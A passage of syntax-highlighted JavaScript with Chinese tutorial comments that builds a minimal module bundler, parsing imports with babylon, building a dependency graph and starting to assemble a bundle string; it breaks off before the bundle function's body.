&lt;span class=&quot;c1&quot;&gt;// 它依赖于哪些文件. 然后,它会尝试了解哪些文件&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 依赖关系取决于它,它会继续这样做,直到它发现&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 我们应用程序中的 每个模块,以及它们如何 相互依赖. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 这种对项目的理解被称为`依赖图`.&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 在这个例子中,我们将创建一个 依赖关系图 并将其用于打包&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 它的所有模块都捆绑在一起. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 让我们开始 : ) &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// &amp;gt;请注意: 这是一个非常简化的例子&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 对这些例子仅仅执行一次循环依赖,缓存模块导出和解析每个模块&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 其他方面的处理都跳过,使这个例子尽可能简单. &lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;babylon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'babylon'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;traverse&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'babel-traverse'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;transformFromAst&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'babel-core'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 我们首先创建一个函数,该函数将接受 文件路径 ,读取内容并提取它的依赖关系. &lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createAsset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 以字符串形式读取文件的内容. &lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;readFileSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   现在我们试图找出这个文件依赖于哪个文件. 我们可以通过查看其内容&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   来获取  `import` 字符串. 然而,这是一个非常笨重的方法,所以我们将使用JavaScript解析器. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   JavaScript解析器是可以读取和理解JavaScript代码的工具. &lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   它们生成一个更抽象的模型,称为`ast (抽象语法树)`.&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我强烈建议你看看[`ast explorer`](https://astexplorer.net) 看看 `ast` 是如何的&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   `ast`包含很多关于我们代码的信息. 我们可以查询它了解我们的代码正在尝试做什么. &lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ast&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;babylon&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;sourceType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'module'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 这个数组将保存这个模块依赖的模块的相对路径.&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dependencies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们遍历`ast`来试着理解这个模块依赖哪些模块. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   要做到这一点,我们检查`ast`中的每个 `import` 声明. ❤️&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;traverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// `Ecmascript`模块相当简单,因为它们是静态的. 这意味着你不能`import`一个变量,&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 或者有条件地`import`另一个模块. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 每次我们看到`import`声明时,我们都可以将其数值视为`依赖性`.&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;ImportDeclaration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// 我们将依赖关系数组推入我们导入的值. ⬅️&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;node&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们还通过递增简单计数器为此模块分配唯一标识符. &lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们使用`Ecmascript`模块和其他JavaScript功能,可能不支持所有浏览器. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   为了确保`我们的bundle`在所有浏览器中运行,&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   我们将使用[babel](https://babeljs.io)来传输它&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 该`presets`选项是一组规则,告诉`babel`如何传输我们的代码. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 我们用`babel-preset-env``将我们的代码转换为浏览器可以运行的东西. &lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;transformFromAst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;presets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'env'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 返回有关此模块的所有信息.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 现在我们可以提取单个模块的依赖关系,我们将通过提取`入口文件{entry}`的依赖关系来解决问题. &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 那么,我们将提取它的每一个依赖关系的依赖关系. 循环下去&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// 直到我们了解应用程序中的每个模块以及它们如何相互依赖. 这个项目的理解被称为`依赖图`.&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createGraph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 首先解析整个文件.&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mainAsset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createAsset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   我们将使用`队列{queue}`来解析每个`资产{asset}`的依赖关系. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   我们正在定义一个只有 入口资产{entry asset} 的数组.&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mainAsset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 我们使用一个`for ... of`循环遍历 队列. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 最初 这个队列 只有一个 资产,但是当我们迭代它时,我们会将额外的 新资产 推入 队列 中. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 这个循环将在 队列 为空时终止. &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 我们的每一个 资产 都有它所依赖模块的相对路径列表. &lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 我们将重复它们,用我们的`createAsset() `函数解析它们,并跟踪此模块在此对象中的依赖关系.&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 这是这个模块所在的目录. &lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 我们遍历其相关路径的列表&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dependencies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forEach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// 我们的`createAsset()`函数需要一个绝对文件名. &lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// 但是该依赖关系数组是保存了相对路径的数组. &lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// 这些路径是相对于导入他们的文件. &lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// 我们可以通过将相对路径与父资源目录的路径连接,将相对路径转变为绝对路径.&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;//去重&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;absolutePath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;relativePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deplicate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(({&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;absolutePath&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deplicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deplicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// 解析资产,读取其内容并提取其依赖关系.&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;createAsset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;absolutePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;//   了解`asset`依赖取决于`child`这一点对我们来说很重要. &lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;//   通过给`asset.mapping`对象增加一个新的属性(值为child.id)来表达这种一一对应的关系.&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;asset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;relativePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// 最后,我们将`child`这个资产推入队列,这样它的依赖关系也将被迭代和解析.&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;child&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   到这一步,队列 就是一个包含目标应用中 每个模块 的数组: &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   这就是我们的表示图.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 接下来,我们定义一个函数,它将使用我们的`graph`并返回一个可以在浏览器中运行的包. &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 我们的包将只有一个自我调用函数:  &lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// `(function() {})()`&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// 该函数将只接收一个参数: 一个包含`graph`中每个模块信息的对象. &lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;graph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;modules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// 在我们到达该函数的主体之前,我们将构建一个作为该函数的参数的对象. &lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 请注意,我们构建的这个字符串被两个花括号 ({}) 包裹,因此对于每个模块,&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// 我们添加一个这种格式的字符串: `key: value,`.&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;graph&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forEach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;//  图表中的每个模块在这个对象中都有一个`entry`. 我们使用`模块的id`作为`key`和一个数组作为`value` (用数组因为我们在每个模块中有2个值) . &lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 第一个值是用函数包装的每个模块的代码. 这是因为模块应该被 限定范围: 在一个模块中定义变量不会影响 其他模块 或 全局范围. &lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 我们的模块在我们将它们`转换{被 babel 转译}`后, 使用`commonjs`模块系统: 他们期望一个`require`, 一个`module`和`exports`对象可用. 那些在浏览器中通常不可用,所以我们将它们实现并将它们注入到函数包装中. &lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 对于第二个值,我们用`stringify`解析模块及其依赖之间的关系(也就是上文的asset.mapping). 解析后的对象看起来像这样: `{'./relative/path': 1}`. &lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// 这是因为我们模块的被转换后会通过相对路径来调用`require()`. 当调用这个函数时,我们应该能够知道依赖图中的哪个模块对应于该模块的相对路径. &lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;modules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: [
      function (require, module, exports) { &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; },
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,
    ],`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;//   最后,我们实现自调函数的主体. &lt;/span&gt;

